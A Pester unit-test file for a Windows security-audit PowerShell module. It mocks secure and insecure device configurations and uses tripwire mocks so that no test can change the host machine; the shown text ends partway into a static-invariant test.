#Requires -Modules Pester
<#
    Unit tests. Windows-only cmdlets are stubbed and mocked, so these run on
    Windows PowerShell 5.1, PowerShell 7 on Windows, and PowerShell 7 on Linux (CI).

    Run:  Invoke-Pester -Path .\tests -Output Detailed
#>

BeforeAll {
    # The suite mocks every Windows write it knows about, but a forgotten mock must not be able to
    # change this machine. Refuse to run elevated outside CI (set CE_TESTS_ALLOW_ELEVATED=1 to override).
    if ($env:OS -eq 'Windows_NT' -and -not $env:CI -and -not $env:CE_TESTS_ALLOW_ELEVATED) {
        $principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        if ($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            throw 'Refusing to run the test suite elevated: run it as a standard user, or set CE_TESTS_ALLOW_ELEVATED=1 in a disposable VM or Windows Sandbox.'
        }
    }

    $script:RepoRoot = Split-Path -Parent $PSScriptRoot
    $modulePath = Join-Path (Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit') 'CEAudit.psd1'

    # Stubs for Windows-only commands so Pester can mock them on any OS. They
    # declare the parameters the module uses so mocks can read them.
    $stubs = @(
        'Get-NetFirewallProfile', 'Get-NetFirewallRule', 'Get-NetFirewallAddressFilter', 'Set-NetFirewallProfile', 'Disable-NetFirewallRule',
        'Get-LocalUser', 'Get-LocalGroupMember', 'Disable-LocalUser', 'Enable-LocalUser',
        'Get-WindowsOptionalFeature', 'Disable-WindowsOptionalFeature', 'Get-CimInstance',
        'Get-Service', 'Set-Service', 'Stop-Service', 'Get-WinEvent',
        'Get-MpComputerStatus', 'Get-MpPreference', 'Set-MpPreference', 'Add-MpPreference', 'Remove-MpPreference', 'Update-MpSignature',
        'Get-AppLockerPolicy', 'Get-BitLockerVolume', 'Confirm-SecureBootUEFI', 'Get-SecureBootUEFI', 'Start-ScheduledTask', 'Get-WindowsFeature', 'Get-MpThreat', 'Get-MpThreatDetection', 'Get-VM', 'Get-VMSwitch', 'Get-VMNetworkAdapter', 'Get-NetNatStaticMapping', 'Get-NetTCPConnection'
    )
    $stubBody = {
        [CmdletBinding()]
        param(
            [Parameter(Position = 0)]$Name, $ClassName, $Namespace, $FeatureName, $PolicyStore, $MountPoint,
            $Direction, $Enabled, $Action, $SID, $ListLog, $TaskPath, $TaskName, $VMName, $VM, $State, [switch]$Online, [switch]$Effective, [switch]$Xml,
            [Parameter(ValueFromPipeline)]$InputObject,
            [Parameter(ValueFromRemainingArguments)]$Rest
        )
        process { }
    }
    foreach ($s in $stubs) {
        if (-not (Get-Command $s -ErrorAction SilentlyContinue)) {
            Set-Item -Path "function:global:$s" -Value $stubBody
        }
    }

    Import-Module $modulePath -Force

    # Tripwires: every command that can change the device throws unless a test mocks it deliberately.
    # A narrower mock (in a Describe, It or InModuleScope) takes precedence, so existing tests keep working;
    # a test that forgets to mock a write fails loudly instead of touching the host.
    $script:MutatingCommands = @(
        'Set-ItemProperty', 'New-ItemProperty', 'Remove-ItemProperty', 'Set-Service', 'Stop-Service', 'Restart-Service',
        'Set-NetFirewallProfile', 'Set-NetFirewallRule', 'Enable-NetFirewallRule', 'Disable-NetFirewallRule',
        'Enable-LocalUser', 'Disable-LocalUser', 'Add-MpPreference', 'Remove-MpPreference', 'Set-MpPreference', 'Update-MpSignature',
        'Enable-WindowsOptionalFeature', 'Disable-WindowsOptionalFeature', 'Suspend-BitLocker', 'Start-ScheduledTask',
        'Start-Process', 'Invoke-Expression', 'New-EventLog', 'Write-EventLog',
        'Set-CESecurityPolicyValue', 'Invoke-CENative',
        # The one way the module reaches a service over the network.
        'Invoke-CEHttpRequest'
    )
    function global:Set-TestTripwires {
        # Re-run after any Import-Module -Force: a fresh module instance has no mocks.
        foreach ($cmd in $script:MutatingCommands) {
            # Resolve inside the module so private helpers (Invoke-CENative, Set-CESecurityPolicyValue) are covered too.
            $known = & (Get-Module CEAudit) { param($n) [bool](Get-Command $n -ErrorAction SilentlyContinue) } $cmd
            if ($known) { Mock -ModuleName CEAudit $cmd { throw "Tripwire: a test reached $cmd without mocking it" }.GetNewClosure() }
        }
        # New-Item creates report folders legitimately; only registry keys are off limits. One default mock
        # that decides in the body: Pester 6 has no fallback when a -ParameterFilter does not match.
        Mock -ModuleName CEAudit New-Item {
            if ("$Path$LiteralPath" -match '^(HK(LM|CU|CR|U|CC):|Registry::)') { throw 'Tripwire: a test reached New-Item on a registry path without mocking it' }
            Microsoft.PowerShell.Management\New-Item @PesterBoundParameters
        }
        # No test writes to the real Application event log. A no-op rather than a tripwire: when the suite
        # runs elevated (CI), Initialize-CEDataFolder may move a test folder aside, which records an event.
        if (& (Get-Module CEAudit) { [bool](Get-Command Write-CEEventEntry -ErrorAction SilentlyContinue) }) { Mock -ModuleName CEAudit Write-CEEventEntry { } }
    }
    Set-TestTripwires

    function global:New-TestHardware {
        <# A recent laptop with patched TPM firmware; -Insecure gives old BIOS and ROCA-affected TPM firmware. #>
        param([switch]$Insecure)
        $biosDate = if ($Insecure) { (Get-Date).AddDays(-1900) } else { (Get-Date).AddDays(-60) }
        [pscustomobject]@{
            Manufacturer = 'Contoso'; Model = 'Laptop 14 G5'; SystemSku = 'CT14G5'; SerialNumber = 'SN-TEST-001'; Baseboard = 'Contoso 8A3B'; BaseboardProduct = '8A3B'
            IsVirtualMachine = $false
            Firmware = [pscustomobject]@{ Vendor = 'Contoso'; Version = $(if ($Insecure) { '1.02.0' } else { '1.20.0' }); ReleaseDate = $biosDate.ToString('yyyy-MM-dd'); Type = 'UEFI' }
            Tpm = [pscustomobject]@{ Readable = $true; Present = $true; Manufacturer = 'IFX'; FirmwareVersion = $(if ($Insecure) { '7.40.2098.0' } else { '7.63.3353.0' }); SpecVersion = '2.0' }
            Cpu = @([pscustomobject]@{ Name = 'Contoso CPU 7'; Manufacturer = 'GenuineIntel'; Cores = 8; LogicalProcessors = 8; MicrocodeRevision = '0x11A' })
            Disks = @([pscustomobject]@{ Model = 'Contoso NVMe 1TB'; FirmwareRevision = '4B2QJXD7'; InterfaceType = 'SCSI'; SizeGB = 954; SerialNumber = 'DSK-001' })
            Errors = @()
        }
    }

    function global:New-TestContext {
        param([hashtable]$Override = @{})
        $ctx = [ordered]@{
            ComputerName = 'TESTPC'; OSFamily = 'Windows 11'; ProductName = 'Windows 10 Pro'; EditionID = 'Professional'
            EditionClass = 'Pro'; DisplayVersion = '25H2'; Build = 26200; UBR = 6584; FullBuild = '26200.6584'
            DomainJoined = $false; EntraJoined = $false; MdmEnrolled = $false; HelloProvisioned = $false
            RunningAs = 'TESTPC\admin'; ConsoleUser = 'TESTPC\paul'; IsElevated = $true; IsSystem = $false; ConsoleUserSid = $null; PSVersion = '7.4'
            AuditTime = (Get-Date); CentrallyManaged = $false
            Hardware = (New-TestHardware)
        }
        foreach ($k in $Override.Keys) { $ctx[$k] = $Override[$k] }
        return [pscustomobject]$ctx
    }

    function global:Set-TestDevice {
        <# Installs mocks describing either an 'insecure' or a 'secure' device. #>
        param([ValidateSet('Insecure', 'Secure')][string]$Kind, [hashtable]$ContextOverride = @{})

        $secure = ($Kind -eq 'Secure')
        $global:CETestCtx = New-TestContext $ContextOverride
        if (-not $secure -and -not $ContextOverride.ContainsKey('Hardware')) { $global:CETestCtx.Hardware = New-TestHardware -Insecure }
        $global:CETestReg = @{}
        $reg = $global:CETestReg
        if ($secure) {
            $reg['HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer|NoDriveTypeAutoRun'] = 255
            $reg['HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer|NoAutorun'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\Explorer|NoAutoplayfornonVolume'] = 1
            $reg['HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System|InactivityTimeoutSecs'] = 600
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork\PINComplexity|MinimumPINLength'] = 6
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\System|EnableSmartScreen'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\System|ShellSmartScreenLevel'] = 'Block'
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Edge|SmartScreenEnabled'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Edge|SmartScreenPuaEnabled'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Edge|PreventSmartScreenPromptOverrideForFiles'] = 1
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\Lsa|RunAsPPL'] = 2
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\Lsa|RestrictAnonymous'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient|EnableMulticast'] = 0
            $reg['HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters|RequireSecuritySignature'] = 1
            $reg['HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit|ProcessCreationIncludeCmdLine_Enabled'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging|EnableScriptBlockLogging'] = 1
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy|VerifiedAndReputablePolicyState'] = 1
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\Servicing|UEFICA2023Status'] = 'Updated'
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\Servicing|WindowsUEFICA2023Capable'] = 2
        }
        else {
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server|fDenyTSConnections'] = 0
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp|UserAuthentication'] = 0
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU|NoAutoUpdate'] = 1
            $reg['HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System|EnableLUA'] = 0
            $reg['HKLM:\SOFTWARE\Policies\Google\Chrome|SafeBrowsingProtectionLevel'] = 0
            $reg['HKLM:\SOFTWARE\Policies\Google\Update|UpdateDefault'] = 0
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest|UseLogonCredential'] = 1
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance|fAllowToGetHelp'] = 1
        }

        Mock -ModuleName CEAudit Get-CEDeviceContext { $global:CETestCtx }
        Mock -ModuleName CEAudit Get-CEFirmwareCatalogRecord { [pscustomobject]@{ Status = 'Disabled'; Record = $null; FromCache = $false; Message = 'test'; Key = $null } }
        Mock -ModuleName CEAudit Get-CERegistryValue {
            $k = "$Path|$Name"
            if ($global:CETestReg.ContainsKey($k)) { return $global:CETestReg[$k] }
            return $Default
        }
        Mock -ModuleName CEAudit Test-CEPendingReboot { -not $global:CETestSecure }
        $global:CETestSecure = $secure

        $fwEnabled = if ($secure) { 'True' } else { 'False' }
        $fwInbound = if ($secure) { 'Block' } else { 'Allow' }
        $global:CETestFw = @('Domain', 'Private', 'Public') | ForEach-Object {
            [pscustomobject]@{ Name = $_; Enabled = $fwEnabled; DefaultInboundAction = $fwInbound; AllowInboundRules = $(if ($secure) { 'False' } else { 'True' }); LogBlocked = 'True'; LogMaxSizeKilobytes = 16384 }
        }
        Mock -ModuleName CEAudit Get-NetFirewallProfile {
            if ($Name) { return $global:CETestFw | Where-Object Name -eq $Name }
            return $global:CETestFw
        }
        Mock -ModuleName CEAudit Get-NetFirewallRule {
            if ($global:CETestSecure) { return @() }
            [pscustomobject]@{ Name = '{1234-ABCD}'; DisplayName = 'Old game server'; DisplayGroup = $null; Profile = 'Any' }
        }
        Mock -ModuleName CEAudit Get-NetFirewallAddressFilter { [pscustomobject]@{ RemoteAddress = 'Any' } }

        Mock -ModuleName CEAudit Get-CimInstance {
            switch ($ClassName) {
                'FirewallProduct' { @() }
                'AntiVirusProduct' {
                    [pscustomobject]@{ displayName = 'Microsoft Defender Antivirus'; productState = $(if ($global:CETestSecure) { 0x61100 } else { 0x61110 }) }
                }
                'Win32_DeviceGuard' {
                    [pscustomobject]@{ VirtualizationBasedSecurityStatus = 2; SecurityServicesRunning = $(if ($global:CETestSecure) { @(2) } else { @(0) }); UsermodeCodeIntegrityPolicyEnforcementStatus = 0 }
                }
                'Win32_Tpm' { [pscustomobject]@{ SpecVersion = '2.0, 0, 1.59' } }
                'Win32_SystemDriver' { $global:CETestDrivers }
                default { $null }
            }
        }

        $users = @(
            [pscustomobject]@{ Name = 'Administrator'; SID = 'S-1-5-21-1-2-3-500'; Enabled = (-not $secure); PasswordRequired = $true; LastLogon = $null },
            [pscustomobject]@{ Name = 'Guest'; SID = 'S-1-5-21-1-2-3-501'; Enabled = (-not $secure); PasswordRequired = $false; LastLogon = $null },
            [pscustomobject]@{ Name = 'paul'; SID = 'S-1-5-21-1-2-3-1001'; Enabled = $true; PasswordRequired = $true; LastLogon = (Get-Date).AddDays(-1) }
        )
        if (-not $secure) {
            $users += [pscustomobject]@{ Name = 'olduser'; SID = 'S-1-5-21-1-2-3-1002'; Enabled = $true; PasswordRequired = $false; LastLogon = (Get-Date).AddDays(-400) }
        }
        $global:CETestUsers = $users
        Mock -ModuleName CEAudit Get-LocalUser { $global:CETestUsers }
        Mock -ModuleName CEAudit Get-LocalGroupMember {
            $m = @([pscustomobject]@{ Name = 'TESTPC\admin'; ObjectClass = 'User'; PrincipalSource = 'Local'; SID = 'S-1-5-21-1-2-3-1003' })
            if (-not $global:CETestSecure) {
                $m += [pscustomobject]@{ Name = 'TESTPC\paul'; ObjectClass = 'User'; PrincipalSource = 'Local'; SID = 'S-1-5-21-1-2-3-1001' }
                $m += [pscustomobject]@{ Name = 'TESTPC\olduser'; ObjectClass = 'User'; PrincipalSource = 'Local'; SID = 'S-1-5-21-1-2-3-1002' }
            }
            $m
        }
        Mock -ModuleName CEAudit Get-WindowsOptionalFeature {
            $state = if ($global:CETestSecure) { 'Disabled' } else { 'Enabled' }
            [pscustomobject]@{ FeatureName = $FeatureName; State = $state }
        }
        # Anti-malware: services, loaded drivers and minifilters (fltmc) seen by MP-01.
        $global:CETestServiceList = @([pscustomobject]@{ Name = 'WinDefend'; Status = 'Running'; StartType = 'Automatic' })
        $global:CETestDrivers = @()
        $global:CETestFltmc = @(
            '', 'Filter Name                     Num Instances    Altitude    Frame',
            '------------------------------  -------------  ------------  -----',
            'bindflt                                 1       409800         0',
            'WdFilter                                6       328010         0',
            'storqosflt                              0       244000         0',
            'FileInfo                                6        40500         0')
        Mock -ModuleName CEAudit Get-Service {
            if (-not $Name) { return $global:CETestServiceList }
            $start = if ($global:CETestSecure) { 'Disabled' } else { 'Automatic' }
            if ($Name -eq 'wuauserv') { $start = 'Manual' }
            [pscustomobject]@{ Name = $Name; StartType = $start; Status = 'Running' }
        }

        Mock -ModuleName CEAudit Invoke-CENative {
            $out = switch -Regex ($FilePath) {
                'net\.exe' {
                    if ($global:CETestSecure) {
                        @('Force user logoff how long after time expires?:       Never', 'Minimum password age (days):                          0',
                          'Maximum password age (days):                          Unlimited', 'Minimum password length:                              12',
                          'Length of password history maintained:                None', 'Lockout threshold:                                    10',
                          'Lockout duration (minutes):                           10', 'Lockout observation window (minutes):                 10',
                          'Computer role:                                        WORKSTATION', 'The command completed successfully.')
                    }
                    else {
                        @('Force user logoff how long after time expires?:       Never', 'Minimum password age (days):                          0',
                          'Maximum password age (days):                          42', 'Minimum password length:                              0',
                          'Length of password history maintained:                None', 'Lockout threshold:                                    Never',
                          'Lockout duration (minutes):                           30', 'Lockout observation window (minutes):                 30',
                          'Computer role:                                        WORKSTATION', 'The command completed successfully.')
                    }
                }
                'whoami' {
                    '"BUILTIN\Users","Alias","S-1-5-32-545","Mandatory group, Enabled by default, Enabled group"'
                    if (-not $global:CETestSecure) { '"BUILTIN\Administrators","Alias","S-1-5-32-544","Group used for deny only"' }
                }
                'fltmc' { $global:CETestFltmc }
                default { @() }
            }
            [pscustomobject]@{ ExitCode = 0; Output = @($out) }
        }
        Mock -ModuleName CEAudit Get-CESecurityPolicy { @{ PasswordComplexity = $(if ($global:CETestSecure) { '0' } else { '1' }) } }
        Mock -ModuleName CEAudit Get-CEAuditPolicy {
            $setting = if ($global:CETestSecure) { 'Success and Failure' } else { 'No Auditing' }
            $map = @{}
            foreach ($g in @('0cce922b', '0cce9215', '0cce923f', '0cce9235', '0cce9237', '0cce9217', '0cce922f')) {
                $map["$g-69ae-11d9-bed3-505054503030"] = [pscustomobject]@{ Name = $g; Setting = $setting }
            }
            $map
        }
        Mock -ModuleName CEAudit Get-CEWindowsUpdateState {
            $pending = @()
            if (-not $global:CETestSecure) {
                $pending += [pscustomobject]@{ Title = '2026-08 Cumulative Update'; KB = 'KB5099999'; Severity = 'Critical'; Released = (Get-Date).AddDays(-30); IsSecurity = $true; Categories = 'Security Updates' }
            }
            [pscustomobject]@{ Pending = $pending; History = @([pscustomobject]@{ Title = 'x'; Date = (Get-Date).AddDays(-3); ResultCode = 2 }) }
        }
        Mock -ModuleName CEAudit Get-CEWingetUpgrades {
            $pkgs = @()
            if (-not $global:CETestSecure) { $pkgs = @([pscustomobject]@{ Name = '7-Zip'; Id = '7zip.7zip'; Version = '23.01'; Available = '25.01'; Source = 'winget' }) }
            [pscustomobject]@{ Available = $true; Packages = $pkgs }
        }
        # The machine-wide VS Code folder is real on CI runners; keep built-in extension scanning out of device mocks.
        Mock -ModuleName CEAudit Get-CEVsCodeBuiltInExtensionDir { , @() }
        Mock -ModuleName CEAudit Get-CEInstalledSoftware {
            $s = @([pscustomobject]@{ Name = 'Microsoft OneDrive'; Version = '25.1'; Publisher = 'Microsoft'; InstallDate = '' })
            if (-not $global:CETestSecure) {
                $s += [pscustomobject]@{ Name = 'Python 3.8.10 (64-bit)'; Version = '3.8.10'; Publisher = 'PSF'; InstallDate = '' }
                $s += [pscustomobject]@{ Name = 'AnyDesk'; Version = '9'; Publisher = 'AnyDesk'; InstallDate = '' }
                $s += [pscustomobject]@{ Name = 'Google Chrome'; Version = '140'; Publisher = 'Google'; InstallDate = '' }
            }
            $s
        }
        Mock -ModuleName CEAudit Get-MpComputerStatus {
            $on = $global:CETestSecure
            [pscustomobject]@{
                AMRunningMode = 'Normal'; AntivirusEnabled = $true; RealTimeProtectionEnabled = $on; BehaviorMonitorEnabled = $true
                IoavProtectionEnabled = $true; OnAccessProtectionEnabled = $true; IsTamperProtected = $on
                AntivirusSignatureLastUpdated = $(if ($on) { (Get-Date).AddHours(-2) } else { (Get-Date).AddDays(-9) })
                AntivirusSignatureVersion = '1.1'; AMEngineVersion = '1.1'; AMProductVersion = '4.18'
            }
        }
        # No virtual machines, WSL or containers unless a test sets them up (keeps this machine's real WSL out of the results).
        Mock -ModuleName CEAudit Get-CEVirtualisationState {
            [pscustomobject]@{ HyperV = [pscustomobject]@{ Readable = $true; Message = ''; Machines = @(); NatMappings = @() }
                VMware = @(); VirtualBox = @(); Wsl = @(); WslNetworking = ''; Containers = @(); Listeners = @(); Notes = @(); NotRead = @() }
        }
        # No AI tools unless a test sets them up (keeps this machine's real apps out of the results).
        Mock -ModuleName CEAudit Get-CEAIToolState { [pscustomobject]@{ Tools = @(); UninspectedProcesses = @(); NotRead = @() } }
        Mock -ModuleName CEAudit Get-CEMcpInventory { [ordered]@{ mcpConfigsFound = 0; mcpConfigsParsed = 0; mcpConfigsUnreadable = @(); mcpServers = @(); credentialsFound = 0; credentialsPlaintext = 0; scanBounds = 'test' } }
        Mock -ModuleName CEAudit Get-MpThreat { @() }
        Mock -ModuleName CEAudit Get-MpThreatDetection { @() }
        Mock -ModuleName CEAudit Get-MpPreference {
            if ($global:CETestSecure) {
                $ids = @((Get-CEConfig).'asr-rules'.rules | ForEach-Object { $_.id })
                [pscustomobject]@{ MAPSReporting = 2; SubmitSamplesConsent = 1; PUAProtection = 1; EnableNetworkProtection = 1
                    AttackSurfaceReductionRules_Ids = $ids; AttackSurfaceReductionRules_Actions = @($ids | ForEach-Object { 1 })
                    ExclusionPath = @(); ExclusionExtension = @(); ExclusionProcess = @() }
            }
            else {
                [pscustomobject]@{ MAPSReporting = 0; SubmitSamplesConsent = 2; PUAProtection = 0; EnableNetworkProtection = 0
                    AttackSurfaceReductionRules_Ids = @(); AttackSurfaceReductionRules_Actions = @()
                    ExclusionPath = @('C:\', 'C:\Tools\build'); ExclusionExtension = @('exe'); ExclusionProcess = @() }
            }
        }
        Mock -ModuleName CEAudit Get-BitLockerVolume {
            if ($global:CETestSecure) {
                [pscustomobject]@{ VolumeStatus = 'FullyEncrypted'; ProtectionStatus = 'On'; EncryptionMethod = 'XtsAes256'
                    KeyProtector = @([pscustomobject]@{ KeyProtectorType = 'TpmPin' }, [pscustomobject]@{ KeyProtectorType = 'RecoveryPassword' }) }
            }
            else {
                [pscustomobject]@{ VolumeStatus = 'FullyDecrypted'; ProtectionStatus = 'Off'; EncryptionMethod = 'None'; KeyProtector = @() }
            }
        }
        Mock -ModuleName CEAudit Confirm-SecureBootUEFI { $global:CETestSecure }
        $global:CETestSbVars = if ($secure) {
            @{ db = 'Microsoft Windows Production PCA 2011 Microsoft Corporation UEFI CA 2011 Windows UEFI CA 2023 Microsoft UEFI CA 2023 Microsoft Option ROM UEFI CA 2023'
               KEK = 'Microsoft Corporation KEK CA 2011 Microsoft Corporation KEK 2K CA 2023' }
        }
        else {
            @{ db = 'Microsoft Windows Production PCA 2011 Microsoft Corporation UEFI CA 2011'; KEK = 'Microsoft Corporation KEK CA 2011' }
        }
        $global:CETestSbEvents = @()
        Mock -ModuleName CEAudit Get-CESecureBootVariableText { $global:CETestSbVars[$Name] }
        Mock -ModuleName CEAudit Get-CESecureBootEvent { $global:CETestSbEvents }
        Mock -ModuleName CEAudit Get-AppLockerPolicy { throw 'not available' }
        Mock -ModuleName CEAudit Get-WinEvent { [pscustomobject]@{ MaximumSizeInBytes = $(if ($global:CETestSecure) { 2GB } else { 20MB }) } }
    }

    function global:Use-TestTags {
        # Makes the module read the reparse tag in Tags (path -> tag) for each of those paths. TestDrive, TEMP and
        # every folder above them are outside the fixture, so the module sees them as plain folders (their
        # attributes and their tag): a test that follows a real junction under TestDrive walks its target from the
        # drive root, and must pass or fail on the module's behaviour only, not on how this machine reaches TEMP (a
        # junction, a symbolic link, a profile container, a folder this account may not look at). Every other path
        # gets its real attributes and tag (Pester 6 mocks have no fallback). A \\?\ path is looked up without its
        # prefix. This account can't create symbolic links, so tests make real junctions look like them this way.
        # -Record keeps every path whose attributes or tag the module asks for in $global:CETestLooked.
        param([hashtable]$Tags = @{}, [switch]$Record)
        $map = @{}
        foreach ($k in $Tags.Keys) { $map[([string]$k).TrimEnd('\').ToLowerInvariant()] = [long]$Tags[$k] }
        $outside = @{}
        $drive = Get-PSDrive -Name TestDrive -ErrorAction SilentlyContinue
        foreach ($start in @($(if ($drive) { $drive.Root }), $env:TEMP, $env:TMP)) {
            if (-not $start) { continue }
            foreach ($form in @([string]$start, [IO.Path]::GetFullPath([string]$start))) {
                $up = $form.TrimEnd('\')
                while ($up -and $up -notmatch '^[A-Za-z]:$') {
                    $outside[$up.ToLowerInvariant()] = $true
                    $up = (Split-Path -Parent $up).TrimEnd('\')
                }
            }
        }
        foreach ($k in $outside.Keys) { if (-not $map.ContainsKey($k)) { $map[$k] = [long]0 } }
        $global:CETestTagMap = $map
        $global:CETestOutside = $outside
        $global:CETestLooked = New-Object System.Collections.ArrayList
        $global:CETestRecordLooks = [bool]$Record
        # The real Get-CEItemPresence: a mock is an alias in the module, so the function itself is still there.
        $global:CETestRealPresence = & (Get-Module CEAudit) { ${function:Get-CEItemPresence} }
        InModuleScope CEAudit { $null = Get-CEReparseTag -Path $env:TEMP }   # loads CEAudit.ReparseTag
        Mock -ModuleName CEAudit Get-CEReparseTag {
            $p = ([string]$Path).TrimEnd('\', '/')
            $bare = ($p -replace '^\\\\\?\\', '').ToLowerInvariant()
            if ($global:CETestRecordLooks) { [void]$global:CETestLooked.Add($bare) }
            if ($global:CETestTagMap.ContainsKey($bare)) { return $global:CETestTagMap[$bare] }
            if (-not $bare -or $bare -match '[*?]') { return [long]-1 }
            return [long][CEAudit.ReparseTag]::Get($p)
        }
        Mock -ModuleName CEAudit Get-CEItemPresence {
            $bare = (([string]$Path).TrimEnd('\', '/') -replace '^\\\\\?\\', '').ToLowerInvariant()
            if ($global:CETestRecordLooks) { [void]$global:CETestLooked.Add($bare) }
            if ($global:CETestOutside.ContainsKey($bare)) {
                return [pscustomobject]@{ State = 'present'; Attributes = [IO.FileAttributes]::Directory; FullName = $Path
                    Name = (([string]$Path).TrimEnd('\', '/') -replace '^.*[\\/]', ''); IsFolder = $true; Reason = '' }
            }
            return (& $global:CETestRealPresence -Path $Path)
        }
    }
}

Describe 'Module structure' {
    It 'loads 57 checks with unique ids' {
        $checks = Get-CECheck
        $checks.Count | Should -Be 57
        ($checks.Id | Sort-Object -Unique).Count | Should -Be $checks.Count
    }

    It 'every check maps to at least one framework and a reference' {
        foreach ($c in Get-CECheck) {
            $c.Frameworks.Count | Should -BeGreaterThan 0 -Because $c.Id
            $c.Reference | Should -Not -BeNullOrEmpty -Because $c.Id
        }
    }

    It 'every remediation referenced by a check exists in the library' {
        $files = Get-ChildItem -Path (Join-Path (Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit') 'Checks') -Filter *.ps1
        $refs = $files | Select-String -Pattern "New-CERemediationRef -Id '([A-Za-z0-9-]+)'" -AllMatches |
            ForEach-Object { $_.Matches } | ForEach-Object { $_.Groups[1].Value } | Sort-Object -Unique
        $lib = (Get-CERemediation).Id
        foreach ($r in $refs) { $lib | Should -Contain $r }
    }

    It 'high-risk remediations are never selected by default' {
        Get-CERemediation | Where-Object Risk -eq 'High' | ForEach-Object { $_.SelectedByDefault | Should -BeFalse -Because $_.Id }
    }

    It 'the CE v3.3 auto-fail areas are flagged' {
        (Get-CECheck -Id 'SU-03').AutoFail | Should -BeTrue
        (Get-CECheck -Id 'SU-05').AutoFail | Should -BeTrue
        (Get-CECheck -Id 'UA-07').AutoFail | Should -BeTrue
    }

    It 'source files are ASCII only (Windows PowerShell 5.1 safe)' {
        # The files git tracks: git-ignored output is not source (a sandbox run leaves its step scripts,
        # UTF-8 with a byte order mark, under build\; a signed release copy is there too).
        $extensions = @('.ps1', '.psm1', '.psd1')
        $files = $null
        $git = @(Get-Command git -CommandType Application -ErrorAction SilentlyContinue)
        if ($git.Count) {
            $listed = & { $ErrorActionPreference = 'Continue'; & $git[0].Source -C $script:RepoRoot -c core.quotepath=off ls-files 2>$null }
            if ($LASTEXITCODE -eq 0 -and @($listed).Count) {
                $files = @($listed | Where-Object { $extensions -contains [IO.Path]::GetExtension($_).ToLowerInvariant() } |
                    ForEach-Object { Join-Path $script:RepoRoot $_ } | Where-Object { Test-Path -LiteralPath $_ -PathType Leaf })
            }
        }
        if ($null -eq $files) {
            # No usable git (the sandbox CI copies the tree without .git; Windows git cannot read a worktree
            # made from WSL): walk the tree, leaving out what .gitignore names without wildcards - build\,
            # output\ and a locally installed packs\ among them. 'name/' is a folder at any depth, '/name/'
            # one at the top of the repository, and 'folder/file' one file.
            $rules = @(Get-Content -LiteralPath (Join-Path $script:RepoRoot '.gitignore') | ForEach-Object { $_.Trim() } | Where-Object { $_ -and $_ -notmatch '^[#!]' -and $_ -notmatch '[*?\[]' })
            $files = @(Get-ChildItem -LiteralPath $script:RepoRoot -Recurse -File | Where-Object { $extensions -contains $_.Extension.ToLowerInvariant() } | Where-Object {
                    $relative = $_.FullName.Substring($script:RepoRoot.Length).TrimStart('\', '/') -replace '\\', '/'
                    $folders = @($relative -split '/' | Select-Object -SkipLast 1)
                    $keep = $folders -notcontains '.git'
                    foreach ($rule in $rules) {
                        $name = $rule.Trim('/')
                        if (-not $rule.EndsWith('/')) { if ($relative -eq $name) { $keep = $false } }
                        elseif ($rule.StartsWith('/')) { if ($folders.Count -and $folders[0] -eq $name) { $keep = $false } }
                        elseif ($folders -contains $name) { $keep = $false }
                    }
                    $keep
                } | ForEach-Object { $_.FullName })
        }
        $files.Count | Should -BeGreaterThan 50 -Because 'the scan must find the sources'
        foreach ($f in $files) {
            $bytes = [IO.File]::ReadAllBytes($f)
            @($bytes | Where-Object { $_ -gt 127 }).Count | Should -Be 0 -Because $f
        }
    }
}

Describe 'Static invariants' {
    BeforeAll {
        $script:srcDir = Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit'
        function global:Get-CommandNames {
            # Names of commands invoked in a file (CommandAst only, so names inside strings do not count).
            param([string]$Path)
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($Path, [ref]$null, [ref]$null)
            @($ast.FindAll({ $args[0] -is [System.Management.Automation.Language.CommandAst] }, $true) |
                ForEach-Object { $_.GetCommandName() } | Where-Object { $_ } | Sort-Object -Unique)
        }
    }

    It 'tripwires fire when module code reaches a mutating command without a mock' {
        # Exercised the way real code hits them: a module function writing the registry, and a native call.
        InModuleScope CEAudit {
            $caught = ''
            try { Set-CERegistryValueTracked -Path 'HKCU:\Software\CETestNoWrite' -Name 'x' -Value 1 -Undo ([System.Collections.ArrayList]@()) } catch { $caught = $_.Exception.Message }
            $caught | Should -Match 'Tripwire.*New-Item'
            $caught = ''
            try { Invoke-CENative -FilePath 'net.exe' -ArgumentList @('accounts') } catch { $caught = $_.Exception.Message }
            $caught | Should -Match 'Tripwire.*Invoke-CENative'
        }
        Test-Path 'HKCU:\Software\CETestNoWrite' | Should -BeFalse
    }

    It 'checks only read: no check file invokes a command that changes the device' {
        # "Read first. Change nothing." - enforced on the AST, not by review.
